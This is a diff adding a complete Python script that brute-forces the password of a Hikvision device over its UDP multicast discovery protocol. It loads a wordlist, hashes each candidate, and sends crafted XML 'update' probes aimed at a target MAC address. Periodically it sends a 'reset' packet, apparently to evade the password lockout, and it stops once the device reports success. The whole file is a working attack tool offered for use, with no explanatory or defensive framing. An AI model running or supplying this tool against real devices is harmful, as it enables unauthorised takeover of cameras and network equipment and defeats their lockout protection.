@@ -1,0 +1,71 @@
+import socket 
+import time 
+import hashlib 
+import base64 
+import re 
+ 
+#UDP multicast address which Hikvision devices listen on 
+UDP_IP = "239.255.255.250" 
+UDP_PORT = 37020 
+MSG_SIZE = 4096 
+ 
+DEVICE_MAC = "AA-BB-CC-DD-EE-FF" #change me - THIS IS THE TARGET DEVICE 
+ 
+#change me - update these params to match the target device configuration 
+NEW_IPV4 = "192.0.0.64" 
+NEW_IPV4_NM = "255.255.255.0" 
+NEW_GATEWAY = "192.0.0.5" 
+
+#change me - path to your dictionary file
+WORDLIST="/tmp/wordlist.txt"
+ 
+#reset lockout counter packet 
+RESET = '<?xml version="1.0" encoding="utf-8"?><Probe><Uuid>DAB7B40C-38AA-4CF0-AB6A-E52E6E52B3B6</Uuid><Types>update</Types><PWErrorParse>true</PWErrorParse><MAC>'+DEVICE_MAC+'</MAC><IPv4Address>'+NEW_IPV4+'</IPv4Address><CommandPort>8000</CommandPort><IPv4SubnetMask>'+NEW_IPV4_NM+'</IPv4SubnetMask><IPv4Gateway>'+NEW_GATEWAY+'</IPv4Gateway><IPv6Address>::</IPv6Address><IPv6Gateway>::</IPv6Gateway><IPv6MaskLen>0</IPv6MaskLen><DHCP>false</DHCP><HttpPort>80</HttpPort></Probe>' 
+ 
+sock = socket.socket(socket.AF_INET, # Internet 
+                     socket.SOCK_DGRAM) # UDP 
+sock.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, 2) 
+sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) 
+sock.settimeout(3) 
+ 
+wordfile = open(WORDLIST, 'r', encoding='utf-8') 
+print("Starting!") 
+ 
+#bruteforce attempts 
+attempt_count = 0 
+ 
+while True: 
+ 
+    word = wordfile.readline().strip() 
+    if not word: 
+        break 
+ 
+    raw_md5 = hashlib.md5(word.encode('utf-8')) 
+    md5b64 = base64.b64encode(raw_md5.digest()).decode('ascii') 
+     
+    brute = '<?xml version="1.0" encoding="utf-8"?><Probe><Uuid>44037D7F-7D48-4DB0-8893-05705C4AE965</Uuid><Types>update</Types><PWErrorParse>true</PWErrorParse><MAC>'+DEVICE_MAC+'</MAC><Password>'+md5b64+'</Password><IPv4Address>'+NEW_IPV4+'</IPv4Address><CommandPort>8000</CommandPort><IPv4SubnetMask>255.255.0.0</IPv4SubnetMask><IPv4Gateway>'+NEW_GATEWAY+'</IPv4Gateway><IPv6Address>::</IPv6Address><IPv6Gateway>::</IPv6Gateway><IPv6MaskLen>0</IPv6MaskLen><DHCP>false</DHCP><HttpPort>80</HttpPort></Probe>' 
+ 
+    if (attempt_count %1000 == 0 and attempt_count !=0): 
+        print(str(attempt_count)+"x requests sent - "+word) 
+ 
+    try: 
+        #send success reset 
+        if (attempt_count % 6 == 0): 
+            sock.sendto(RESET.encode(), (UDP_IP, UDP_PORT)) 
+            data = sock.recv(MSG_SIZE) 
+ 
+        sock.sendto(brute.encode(), (UDP_IP, UDP_PORT)) 
+        data = sock.recv(MSG_SIZE) 
+ 
+        if (re.search(r"success", data.decode())): 
+            print("[+] Success: "+word) 
+            print(data.decode()) 
+            break 
+         
+    except: 
+        print("TIMEOUT") 
+         
+    attempt_count += 1 
+ 
+print("DONE") 
+sock.close()
